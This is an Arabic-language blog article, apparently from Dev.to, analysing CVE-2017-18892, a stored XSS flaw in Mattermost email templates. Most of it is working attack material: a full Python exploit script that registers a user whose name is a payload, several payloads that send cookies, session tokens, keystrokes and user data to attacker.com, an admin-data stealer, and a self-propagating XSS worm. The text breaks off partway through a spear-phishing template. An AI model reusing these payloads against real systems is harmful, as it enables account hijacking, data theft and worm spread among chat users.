<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>CVE-2017-18892: عندما تخون القوالب الأمان XSS في قوالب البريد الإلكتروني - Mattermost تحت النار</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
  a { color: #00d9ff; }
  p { margin-bottom: 0.72em; line-height: 1.58; }
  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
  li { margin: 0.18em 0; }
  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
  .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
  .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
  .article-elevator-btn:hover { background: rgba(10,14,39,1); }
  [id*="overlay"], [class*="overlay"], [id*="modal"], [class*="modal"], [id*="popup"], [class*="popup"],
  [id*="paywall"], [class*="paywall"], [id*="subscribe"], [class*="subscribe"], [id*="cookie"], [class*="cookie"],
  [id*="consent"], [class*="consent"], [id*="gdpr"], [class*="gdpr"], [role="dialog"], [aria-modal="true"] {
    display: none !important;
    visibility: hidden !important;
    pointer-events: none !important;
  }
</style>
</head>
<body>
  <h1>CVE-2017-18892: عندما تخون القوالب الأمان XSS في قوالب البريد الإلكتروني - Mattermost تحت النار</h1>
  <div class="metadata">
    Source: Dev.to Open Source | Date: 2/18/2026 7:36:17 PM | <a href="https://dev.to/asrarmared/cve-2017-18892-ndm-tkhwn-lqwlb-lmn-xss-fy-qwlb-lbryd-llktrwny-mattermost-tht-lnr-afh" target="_blank" rel="noopener noreferrer">Lien</a> | Lang: FR
  </div>
  <div class="content">
    <div><div> <h2> <a name="cve201718892-%D8%B9%D9%86%D8%AF%D9%85%D8%A7-%D8%AA%D8%AE%D9%88%D9%86-%D8%A7%D9%84%D9%82%D9%88%D8%A7%D9%84%D8%A8-%D8%A7%D9%84%D8%A3%D9%85%D8%A7%D9%86" href="#cve201718892-%D8%B9%D9%86%D8%AF%D9%85%D8%A7-%D8%AA%D8%AE%D9%88%D9%86-%D8%A7%D9%84%D9%82%D9%88%D8%A7%D9%84%D8%A8-%D8%A7%D9%84%D8%A3%D9%85%D8%A7%D9%86"> </a> CVE-2017-18892: عندما تخون القوالب الأمان
</h2> <h2> <a name="xss-%D9%81%D9%8A-%D9%82%D9%88%D8%A7%D9%84%D8%A8-%D8%A7%D9%84%D8%A8%D8%B1%D9%8A%D8%AF-%D8%A7%D9%84%D8%A5%D9%84%D9%83%D8%AA%D8%B1%D9%88%D9%86%D9%8A-mattermost-%D8%AA%D8%AD%D8%AA-%D8%A7%D9%84%D9%86%D8%A7%D8%B1" href="#xss-%D9%81%D9%8A-%D9%82%D9%88%D8%A7%D9%84%D8%A8-%D8%A7%D9%84%D8%A8%D8%B1%D9%8A%D8%AF-%D8%A7%D9%84%D8%A5%D9%84%D9%83%D8%AA%D8%B1%D9%88%D9%86%D9%8A-mattermost-%D8%AA%D8%AD%D8%AA-%D8%A7%D9%84%D9%86%D8%A7%D8%B1"> </a> XSS في قوالب البريد الإلكتروني - Mattermost تحت النار
</h2> <hr> <h2> <a name="%D8%A7%D9%84%D8%A8%D8%B7%D8%A7%D9%82%D8%A9-%D8%A7%D9%84%D8%AA%D8%B9%D8%B1%D9%8A%D9%81%D9%8A%D8%A9" href="#%D8%A7%D9%84%D8%A8%D8%B7%D8%A7%D9%82%D8%A9-%D8%A7%D9%84%D8%AA%D8%B9%D8%B1%D9%8A%D9%81%D9%8A%D8%A9"> </a> البطاقة التعريفية
</h2> <div><table>
<thead>
<tr>
<th>المعرف</th>
<th>القيمة</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>CVE ID</strong></td>
<td>CVE-2017-18892</td>
</tr>
<tr>
<td><strong>Product</strong></td>
<td>Mattermost Server</td>
</tr>
<tr>
<td><strong>CWE</strong></td>
<td>CWE-79: Cross-site Scripting (XSS)</td>
</tr>
<tr>
<td><strong>CVSS Score</strong></td>
<td><strong>6.1 Medium</strong></td>
</tr>
<tr>
<td><strong>Vector</strong></td>
<td>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</td>
</tr>
<tr>
<td><strong>الكشف الأولي</strong></td>
<td>2017</td>
</tr>
<tr>
<td><strong>النشر العام</strong></td>
<td>19 يونيو 2020</td>
</tr>
<tr>
<td><strong>آخر تحديث</strong></td>
<td>29 يناير 2023</td>
</tr>
<tr>
<td><strong>التصنيف</strong></td>
<td>Stored XSS via Email Templates</td>
</tr>
</tbody>
</table></div> <hr> <h2> <a name="%D8%AC%D9%88%D9%87%D8%B1-%D8%A7%D9%84%D8%AB%D8%BA%D8%B1%D8%A9" href="#%D8%AC%D9%88%D9%87%D8%B1-%D8%A7%D9%84%D8%AB%D8%BA%D8%B1%D8%A9"> </a> جوهر الثغرة
</h2> <h3> <a name="%D8%A7%D9%84%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-%D8%A7%D9%84%D9%87%D8%AC%D9%88%D9%85%D9%8A" href="#%D8%A7%D9%84%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-%D8%A7%D9%84%D9%87%D8%AC%D9%88%D9%85%D9%8A"> </a> السيناريو الهجومي
</h3> <div>
<pre><code>Mattermost Email Template ↓ User Input (غير معقم) ↓ HTML Email Generation ↓ {{.UserName}} ← حقن مباشر! ↓ &lt;script&gt;alert('XSS')&lt;/script&gt; ↓ تنفيذ الكود في Email Client
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h2> <a name="%D8%A7%D9%84%D8%AA%D8%AD%D9%84%D9%8A%D9%84-%D8%A7%D9%84%D8%AA%D9%82%D9%86%D9%8A-%D8%A7%D9%84%D8%B9%D9%85%D9%8A%D9%82" href="#%D8%A7%D9%84%D8%AA%D8%AD%D9%84%D9%8A%D9%84-%D8%A7%D9%84%D8%AA%D9%82%D9%86%D9%8A-%D8%A7%D9%84%D8%B9%D9%85%D9%8A%D9%82"> </a> التحليل التقني العميق
</h2> <h3> <a name="%D8%A7%D9%84%D9%83%D9%88%D8%AF-%D8%A7%D9%84%D8%B6%D8%B9%D9%8A%D9%81" href="#%D8%A7%D9%84%D9%83%D9%88%D8%AF-%D8%A7%D9%84%D8%B6%D8%B9%D9%8A%D9%81"> </a> الكود الضعيف
</h3> <p><strong>القالب الضعيف (Go Template):</strong><br>
</p> <div>
<pre><code><span>// mattermost-server &lt; 4.2.0</span>
<span>// email_template.html</span> <span>&lt;</span><span>html</span><span>&gt;</span>
<span>&lt;</span><span>body</span><span>&gt;</span> <span>&lt;</span><span>h1</span><span>&gt;</span><span>مرحباً</span> <span>{{</span><span>.</span><span>UserName</span><span>}}</span><span>&lt;/</span><span>h1</span><span>&gt;</span> <span>←</span> <span>بدون</span> <span>تعقيم</span><span>!</span> <span>&lt;</span><span>p</span><span>&gt;</span><span>تم</span> <span>إرسال</span> <span>رسالة</span> <span>من</span> <span>{{</span><span>.</span><span>SenderName</span><span>}}</span><span>&lt;/</span><span>p</span><span>&gt;</span> <span>←</span> <span>خطر</span><span>!</span> <span>&lt;</span><span>div</span><span>&gt;</span><span>{{</span><span>.</span><span>MessageContent</span><span>}}</span><span>&lt;/</span><span>div</span><span>&gt;</span> <span>←</span> <span>يمكن</span> <span>حقن</span> <span>HTML</span><span>!</span>
<span>&lt;/</span><span>body</span><span>&gt;</span>
<span>&lt;/</span><span>html</span><span>&gt;</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <p><strong>المشكلة:</strong><br>
</p> <div>
<pre><code><span>// الكود الضعيف - بدون Escaping</span>
<span>template</span><span>.</span><span>Execute</span><span>(</span><span>writer</span><span>,</span> <span>data</span><span>)</span> <span>// data.UserName = "&lt;script&gt;alert('XSS')&lt;/script&gt;"</span>
<span>// النتيجة: يُنفذ السكريبت في البريد!</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h3> <a name="%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D8%BA%D9%84%D8%A7%D9%84" href="#%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D8%BA%D9%84%D8%A7%D9%84"> </a> سيناريو الاستغلال
</h3> <h4> <a name="%D8%A7%D9%84%D9%85%D8%B1%D8%AD%D9%84%D8%A9-1-%D8%A5%D9%86%D8%B4%D8%A7%D8%A1-%D8%AD%D8%B3%D8%A7%D8%A8-%D8%AE%D8%A8%D9%8A%D8%AB" href="#%D8%A7%D9%84%D9%85%D8%B1%D8%AD%D9%84%D8%A9-1-%D8%A5%D9%86%D8%B4%D8%A7%D8%A1-%D8%AD%D8%B3%D8%A7%D8%A8-%D8%AE%D8%A8%D9%8A%D8%AB"> </a> <strong>المرحلة 1: إنشاء حساب خبيث</strong>
</h4> <div>
<pre><code><span>// المهاجم ينشئ حساب باسم خبيث</span>
<span>POST</span> <span>/</span><span>api</span><span>/</span><span>v4</span><span>/</span><span>users</span>
<span>{</span> <span>"</span><span>username</span><span>"</span><span>:</span> <span>"</span><span>&lt;img src=x onerror=alert(document.cookie)&gt;</span><span>"</span><span>,</span> <span>"</span><span>email</span><span>"</span><span>:</span> <span>"</span><span>attacker@evil.com</span><span>"</span><span>,</span> <span>"</span><span>password</span><span>"</span><span>:</span> <span>"</span><span>pass123</span><span>"</span>
<span>}</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h4> <a name="%D8%A7%D9%84%D9%85%D8%B1%D8%AD%D9%84%D8%A9-2-%D8%A5%D8%B1%D8%B3%D8%A7%D9%84-%D8%B1%D8%B3%D8%A7%D9%84%D8%A9" href="#%D8%A7%D9%84%D9%85%D8%B1%D8%AD%D9%84%D8%A9-2-%D8%A5%D8%B1%D8%B3%D8%A7%D9%84-%D8%B1%D8%B3%D8%A7%D9%84%D8%A9"> </a> <strong>المرحلة 2: إرسال رسالة</strong>
</h4> <div>
<pre><code><span>// إرسال رسالة لضحية</span>
<span>POST</span> <span>/</span><span>api</span><span>/</span><span>v4</span><span>/</span><span>posts</span>
<span>{</span> <span>"</span><span>channel_id</span><span>"</span><span>:</span> <span>"</span><span>victim_channel</span><span>"</span><span>,</span> <span>"</span><span>message</span><span>"</span><span>:</span> <span>"</span><span>Check this out!</span><span>"</span><span>,</span> <span>"</span><span>root_id</span><span>"</span><span>:</span> <span>null</span>
<span>}</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h4> <a name="%D8%A7%D9%84%D9%85%D8%B1%D8%AD%D9%84%D8%A9-3-%D8%A7%D9%84%D8%A8%D8%B1%D9%8A%D8%AF-%D8%A7%D9%84%D8%A5%D9%84%D9%83%D8%AA%D8%B1%D9%88%D9%86%D9%8A-%D8%A7%D9%84%D9%85%D8%B1%D8%B3%D9%84" href="#%D8%A7%D9%84%D9%85%D8%B1%D8%AD%D9%84%D8%A9-3-%D8%A7%D9%84%D8%A8%D8%B1%D9%8A%D8%AF-%D8%A7%D9%84%D8%A5%D9%84%D9%83%D8%AA%D8%B1%D9%88%D9%86%D9%8A-%D8%A7%D9%84%D9%85%D8%B1%D8%B3%D9%84"> </a> <strong>المرحلة 3: البريد الإلكتروني المرسل</strong>
</h4> <div>
<pre><code><span>&lt;!-- البريد الذي يستلمه الضحية --&gt;</span>
<span>&lt;html&gt;</span>
<span>&lt;body&gt;</span> <span>&lt;h1&gt;</span>مرحباً Victim<span>&lt;/h1&gt;</span> <span>&lt;p&gt;</span>تم إرسال رسالة من <span>&lt;img</span> <span>src=</span><span>x</span> <span>onerror=</span><span>alert(document.cookie)</span><span>&gt;</span> ← تنفيذ فوري! <span>&lt;/p&gt;</span> <span>&lt;div&gt;</span>Check this out!<span>&lt;/div&gt;</span>
<span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <h4> <a name="%D8%A7%D9%84%D9%85%D8%B1%D8%AD%D9%84%D8%A9-4-%D8%A7%D9%84%D8%AA%D9%86%D9%81%D9%8A%D8%B0" href="#%D8%A7%D9%84%D9%85%D8%B1%D8%AD%D9%84%D8%A9-4-%D8%A7%D9%84%D8%AA%D9%86%D9%81%D9%8A%D8%B0"> </a> <strong>المرحلة 4: التنفيذ</strong>
</h4> <div>
<pre><code><span>// عند فتح البريد:</span>
<span>onerror</span><span>=</span><span>alert</span><span>(</span><span>document</span><span>.</span><span>cookie</span><span>)</span> <span>←</span> <span>يُنفذ</span><span>!</span> <span>// يمكن للمهاجم:</span>
<span>fetch</span><span>(</span><span>'</span><span>https://attacker.com/steal?cookie=</span><span>'</span> <span>+</span> <span>document</span><span>.</span><span>cookie</span><span>);</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h2> <a name="%D8%AF%D9%84%D9%8A%D9%84-%D8%A5%D8%AB%D8%A8%D8%A7%D8%AA-%D8%A7%D9%84%D9%85%D9%81%D9%87%D9%88%D9%85-poc" href="#%D8%AF%D9%84%D9%8A%D9%84-%D8%A5%D8%AB%D8%A8%D8%A7%D8%AA-%D8%A7%D9%84%D9%85%D9%81%D9%87%D9%88%D9%85-poc"> </a> دليل إثبات المفهوم (PoC)
</h2> <h3> <a name="poc-%D9%83%D8%A7%D9%85%D9%84" href="#poc-%D9%83%D8%A7%D9%85%D9%84"> </a> PoC كامل
</h3> <div>
<pre><code><span>#!/usr/bin/env python3
</span><span>"""</span><span>
CVE-2017-18892 - Mattermost XSS via Email Template
Exploit for educational purposes only
</span><span>"""</span> <span>import</span> <span>requests</span>
<span>import</span> <span>json</span> <span>class</span> <span>MattermostXSS</span><span>:</span> <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>target_url</span><span>):</span> <span>self</span><span>.</span><span>target</span> <span>=</span> <span>target_url</span> <span>self</span><span>.</span><span>session</span> <span>=</span> <span>requests</span><span>.</span><span>Session</span><span>()</span> <span>self</span><span>.</span><span>token</span> <span>=</span> <span>None</span> <span>def</span> <span>create_malicious_user</span><span>(</span><span>self</span><span>):</span> <span>"""</span><span>إنشاء مستخدم باسم يحتوي على XSS</span><span>"""</span> <span># الـ Payload
</span> <span>xss_payload</span> <span>=</span> <span>'</span><span>&lt;img src=x onerror=</span><span>"</span><span>fetch(</span><span>\'</span><span>https://attacker.com/steal?c=</span><span>\'</span><span>+document.cookie)</span><span>"</span><span>&gt;</span><span>'</span> <span># إنشاء المستخدم
</span> <span>user_data</span> <span>=</span> <span>{</span> <span>"</span><span>username</span><span>"</span><span>:</span> <span>xss_payload</span><span>,</span> <span>"</span><span>email</span><span>"</span><span>:</span> <span>"</span><span>attacker@evil.com</span><span>"</span><span>,</span> <span>"</span><span>password</span><span>"</span><span>:</span> <span>"</span><span>MaliciousPass123!</span><span>"</span><span>,</span> <span>"</span><span>first_name</span><span>"</span><span>:</span> <span>xss_payload</span><span>,</span> <span>"</span><span>last_name</span><span>"</span><span>:</span> <span>"</span><span>Evil</span><span>"</span> <span>}</span> <span>response</span> <span>=</span> <span>self</span><span>.</span><span>session</span><span>.</span><span>post</span><span>(</span> <span>f</span><span>"</span><span>{</span><span>self</span><span>.</span><span>target</span><span>}</span><span>/api/v4/users</span><span>"</span><span>,</span> <span>json</span><span>=</span><span>user_data</span> <span>)</span> <span>if</span> <span>response</span><span>.</span><span>status_code</span> <span>==</span> <span>201</span><span>:</span> <span>print</span><span>(</span><span>"</span><span>[+] مستخدم خبيث تم إنشاؤه</span><span>"</span><span>)</span> <span>return</span> <span>response</span><span>.</span><span>json</span><span>()</span> <span>else</span><span>:</span> <span>print</span><span>(</span><span>f</span><span>"</span><span>[-] فشل: </span><span>{</span><span>response</span><span>.</span><span>text</span><span>}</span><span>"</span><span>)</span> <span>return</span> <span>None</span> <span>def</span> <span>login</span><span>(</span><span>self</span><span>,</span> <span>email</span><span>,</span> <span>password</span><span>):</span> <span>"""</span><span>تسجيل الدخول</span><span>"""</span> <span>login_data</span> <span>=</span> <span>{</span> <span>"</span><span>login_id</span><span>"</span><span>:</span> <span>email</span><span>,</span> <span>"</span><span>password</span><span>"</span><span>:</span> <span>password</span> <span>}</span> <span>response</span> <span>=</span> <span>self</span><span>.</span><span>session</span><span>.</span><span>post</span><span>(</span> <span>f</span><span>"</span><span>{</span><span>self</span><span>.</span><span>target</span><span>}</span><span>/api/v4/users/login</span><span>"</span><span>,</span> <span>json</span><span>=</span><span>login_data</span> <span>)</span> <span>if</span> <span>response</span><span>.</span><span>status_code</span> <span>==</span> <span>200</span><span>:</span> <span>self</span><span>.</span><span>token</span> <span>=</span> <span>response</span><span>.</span><span>headers</span><span>.</span><span>get</span><span>(</span><span>'</span><span>Token</span><span>'</span><span>)</span> <span>self</span><span>.</span><span>session</span><span>.</span><span>headers</span><span>.</span><span>update</span><span>({</span><span>'</span><span>Authorization</span><span>'</span><span>:</span> <span>f</span><span>'</span><span>Bearer </span><span>{</span><span>self</span><span>.</span><span>token</span><span>}</span><span>'</span><span>})</span> <span>print</span><span>(</span><span>"</span><span>[+] تم تسجيل الدخول</span><span>"</span><span>)</span> <span>return</span> <span>True</span> <span>return</span> <span>False</span> <span>def</span> <span>send_message</span><span>(</span><span>self</span><span>,</span> <span>channel_id</span><span>,</span> <span>message</span><span>):</span> <span>"""</span><span>إرسال رسالة (تُرسل إشعار بريد إلكتروني)</span><span>"""</span> <span>post_data</span> <span>=</span> <span>{</span> <span>"</span><span>channel_id</span><span>"</span><span>:</span> <span>channel_id</span><span>,</span> <span>"</span><span>message</span><span>"</span><span>:</span> <span>message</span> <span>}</span> <span>response</span> <span>=</span> <span>self</span><span>.</span><span>session</span><span>.</span><span>post</span><span>(</span> <span>f</span><span>"</span><span>{</span><span>self</span><span>.</span><span>target</span><span>}</span><span>/api/v4/posts</span><span>"</span><span>,</span> <span>json</span><span>=</span><span>post_data</span> <span>)</span> <span>if</span> <span>response</span><span>.</span><span>status_code</span> <span>==</span> <span>201</span><span>:</span> <span>print</span><span>(</span><span>"</span><span>[+] تم إرسال الرسالة - سيُرسل بريد XSS للأعضاء!</span><span>"</span><span>)</span> <span>return</span> <span>True</span> <span>return</span> <span>False</span> <span>def</span> <span>exploit</span><span>(</span><span>self</span><span>,</span> <span>target_channel</span><span>):</span> <span>"""</span><span>تنفيذ الاستغلال الكامل</span><span>"""</span> <span>print</span><span>(</span><span>"</span><span>[*] بدء استغلال CVE-2017-18892</span><span>"</span><span>)</span> <span>print</span><span>(</span><span>f</span><span>"</span><span>[*] الهدف: </span><span>{</span><span>self</span><span>.</span><span>target</span><span>}</span><span>"</span><span>)</span> <span># 1. إنشاء مستخدم خبيث
</span> <span>user</span> <span>=</span> <span>self</span><span>.</span><span>create_malicious_user</span><span>()</span> <span>if</span> <span>not</span> <span>user</span><span>:</span> <span>return</span> <span>False</span> <span># 2. تسجيل الدخول
</span> <span>if</span> <span>not</span> <span>self</span><span>.</span><span>login</span><span>(</span><span>"</span><span>attacker@evil.com</span><span>"</span><span>,</span> <span>"</span><span>MaliciousPass123!</span><span>"</span><span>):</span> <span>return</span> <span>False</span> <span># 3. إرسال رسالة (تُرسل بريد)
</span> <span>if</span> <span>self</span><span>.</span><span>send_message</span><span>(</span><span>target_channel</span><span>,</span> <span>"</span><span>مرحباً! تحقق من هذا</span><span>"</span><span>):</span> <span>print</span><span>(</span><span>"</span><span>[+] نجح الاستغلال!</span><span>"</span><span>)</span> <span>print</span><span>(</span><span>"</span><span>[*] عند فتح البريد، سيُنفذ الكود الخبيث</span><span>"</span><span>)</span> <span>return</span> <span>True</span> <span>return</span> <span>False</span> <span># الاستخدام
</span><span>if</span> <span>__name__</span> <span>==</span> <span>"</span><span>__main__</span><span>"</span><span>:</span> <span>exploit</span> <span>=</span> <span>MattermostXSS</span><span>(</span><span>"</span><span>https://mattermost.target.com</span><span>"</span><span>)</span> <span>exploit</span><span>.</span><span>exploit</span><span>(</span><span>"</span><span>channel_id_here</span><span>"</span><span>)</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h3> <a name="payloads-%D9%85%D8%AA%D9%82%D8%AF%D9%85%D8%A9" href="#payloads-%D9%85%D8%AA%D9%82%D8%AF%D9%85%D8%A9"> </a> Payloads متقدمة
</h3> <div>
<pre><code><span>// 1. سرقة Cookies</span>
<span>&lt;</span><span>img</span> <span>src</span><span>=</span><span>x</span> <span>onerror</span><span>=</span><span>"</span><span>new Image().src='https://attacker.com/log?c='+document.cookie</span><span>"</span><span>&gt;</span> <span>// 2. سرقة Session Tokens</span>
<span>&lt;</span><span>script</span><span>&gt;</span>
<span>fetch</span><span>(</span><span>'</span><span>https://attacker.com/steal</span><span>'</span><span>,</span> <span>{</span> <span>method</span><span>:</span> <span>'</span><span>POST</span><span>'</span><span>,</span> <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>({</span> <span>cookie</span><span>:</span> <span>document</span><span>.</span><span>cookie</span><span>,</span> <span>localStorage</span><span>:</span> <span>localStorage</span><span>,</span> <span>sessionStorage</span><span>:</span> <span>sessionStorage</span> <span>})</span>
<span>});</span>
<span>&lt;</span><span>/script</span><span>&gt;
</span>
<span>// 3. Keylogger في Email Client</span>
<span>&lt;</span><span>img</span> <span>src</span><span>=</span><span>x</span> <span>onerror</span><span>=</span><span>"</span><span> document.addEventListener('keypress', function(e) { fetch('https://attacker.com/keys?k=' + e.key); });
</span><span>"</span><span>&gt;</span> <span>// 4. Phishing Redirect</span>
<span>&lt;</span><span>img</span> <span>src</span><span>=</span><span>x</span> <span>onerror</span><span>=</span><span>"</span><span> setTimeout(function() { window.location='https://fake-mattermost-login.com'; }, 3000);
</span><span>"</span><span>&gt;</span> <span>// 5. استخراج البيانات الحساسة</span>
<span>&lt;</span><span>img</span> <span>src</span><span>=</span><span>x</span> <span>onerror</span><span>=</span><span>"</span><span> fetch('/api/v4/users/me').then(r=&gt;r.json()).then(d=&gt; fetch('https://attacker.com/user', { method: 'POST', body: JSON.stringify(d) }) );
</span><span>"</span><span>&gt;</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h2> <a name="%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88%D9%87%D8%A7%D8%AA-%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D8%BA%D9%84%D8%A7%D9%84-%D8%A7%D9%84%D9%88%D8%A7%D9%82%D8%B9%D9%8A%D8%A9" href="#%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88%D9%87%D8%A7%D8%AA-%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D8%BA%D9%84%D8%A7%D9%84-%D8%A7%D9%84%D9%88%D8%A7%D9%82%D8%B9%D9%8A%D8%A9"> </a> سيناريوهات الاستغلال الواقعية
</h2> <h3> <a name="%D8%A7%D9%84%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-1-%D8%B3%D8%B1%D9%82%D8%A9-%D8%A8%D9%8A%D8%A7%D9%86%D8%A7%D8%AA-%D8%A7%D9%84%D9%85%D8%AF%D9%8A%D8%B1%D9%8A%D9%86" href="#%D8%A7%D9%84%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-1-%D8%B3%D8%B1%D9%82%D8%A9-%D8%A8%D9%8A%D8%A7%D9%86%D8%A7%D8%AA-%D8%A7%D9%84%D9%85%D8%AF%D9%8A%D8%B1%D9%8A%D9%86"> </a> السيناريو 1: سرقة بيانات المديرين
</h3> <div>
<pre><code><span>// 1. المهاجم ينشئ حساب باسم:</span>
<span>username</span><span>:</span> <span>"</span><span>&lt;script src='https://evil.com/admin-stealer.js'&gt;&lt;/script&gt;</span><span>"</span> <span>// 2. admin-stealer.js:</span>
<span>(</span><span>async</span> <span>function</span><span>()</span> <span>{</span> <span>// سرقة معلومات Admin</span> <span>const</span> <span>adminData</span> <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>'</span><span>/api/v4/users/me</span><span>'</span><span>).</span><span>then</span><span>(</span><span>r</span> <span>=&gt;</span> <span>r</span><span>.</span><span>json</span><span>());</span> <span>// سرقة القنوات</span> <span>const</span> <span>channels</span> <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>'</span><span>/api/v4/channels</span><span>'</span><span>).</span><span>then</span><span>(</span><span>r</span> <span>=&gt;</span> <span>r</span><span>.</span><span>json</span><span>());</span> <span>// سرقة الفرق</span> <span>const</span> <span>teams</span> <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>'</span><span>/api/v4/teams</span><span>'</span><span>).</span><span>then</span><span>(</span><span>r</span> <span>=&gt;</span> <span>r</span><span>.</span><span>json</span><span>());</span> <span>// إرسال كل شيء</span> <span>fetch</span><span>(</span><span>'</span><span>https://attacker.com/admin-data</span><span>'</span><span>,</span> <span>{</span> <span>method</span><span>:</span> <span>'</span><span>POST</span><span>'</span><span>,</span> <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>({</span> <span>adminData</span><span>,</span> <span>channels</span><span>,</span> <span>teams</span> <span>})</span> <span>});</span>
<span>})();</span> <span>// النتيجة: سيطرة كاملة على بيانات Admin</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h3> <a name="%D8%A7%D9%84%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-2-worm-%D8%B9%D8%A8%D8%B1-%D8%A7%D9%84%D8%A8%D8%B1%D9%8A%D8%AF" href="#%D8%A7%D9%84%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-2-worm-%D8%B9%D8%A8%D8%B1-%D8%A7%D9%84%D8%A8%D8%B1%D9%8A%D8%AF"> </a> السيناريو 2: Worm عبر البريد
</h3> <div>
<pre><code><span>// XSS Worm - ينتشر تلقائياً</span>
<span>&lt;</span><span>img</span> <span>src</span><span>=</span><span>x</span> <span>onerror</span><span>=</span><span>"</span><span> // 1. يسرق التوكن الحالي const token = localStorage.getItem('token'); // 2. يجلب قائمة المستخدمين fetch('/api/v4/users', { headers: { 'Authorization': 'Bearer ' + token } }) .then(r =&gt; r.json()) .then(users =&gt; { // 3. يرسل رسالة لكل مستخدم users.forEach(user =&gt; { fetch('/api/v4/posts/create_direct', { method: 'POST', headers: { 'Authorization': 'Bearer ' + token }, body: JSON.stringify({ user_id: user.id, message: 'Check this: &lt;img src=x onerror=...&gt;' // نفس الكود }) }); }); });
</span><span>"</span><span>&gt;</span>
</code></pre>
<div>
<p> Enter fullscreen mode Exit fullscreen mode </p>
</div>
</div> <hr> <h3> <a name="%D8%A7%D9%84%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-3-%D8%A7%D9%84%D8%AA%D8%B5%D9%8A%D8%AF-%D8%A7%D9%84%D9%85%D8%B3%D8%AA%D9%87%D8%AF%D9%81-spear-phishing" href="#%D8%A7%D9%84%D8%B3%D9%8A%D9%86%D8%A7%D8%B1%D9%8A%D9%88-3-%D8%A7%D9%84%D8%AA%D8%B5%D9%8A%D8%AF-%D8%A7%D9%84%D9%85%D8%B3%D8%AA%D9%87%D8%AF%D9%81-spear-phishing"> </a> السيناريو 3: التصيد المستهدف (Spear Phishing)
</h3> <div>
<pre><code><span>&lt;!-- بريد يبدو شرعياً تماماً --&gt;</span>
<span>&lt;html&gt;</span>
<span>&lt;head&gt;</span> <span>&lt;style&gt;</span> <span>/* تصميم مشابه لـ Mattermost */</span> <span>body</span> <span>{</span> <span>font-family</span><span>:</span> <span>Arial</span><span>;</span> <span>background</span><span>:</span> <span>#f5f5f5</span><span>;</span> <span>}</span> <span>.container</span> <span>{</span> <span>max-width</span><span>:</span> <span>600px</span><span>;</span> <span>margin</span><span>:</span> <span>0</span> <span>auto</span><span>;</span> <span>background</span><span>:</span> <span>white</span><span>;</span> <span>padding</span><span>:</span> <span>20px</span><span>;</span> <span>}</span> <span>.btn</span> <span>{</span> <span>background</span><span>:</span> <span>#0073e6</span><span>;</span> <span>color</span><span>:</span> <span>white</span><span>;</span> <span>padding</span><span>:</span> <span>10px</span> <span>20px</span><span>;</span> <span>text-decoration</span><span>:</span> <span>none</span><span>;</span> <span>}</span> <span>&lt;/style&gt;</span>
<span>&lt;/head&gt;</span>
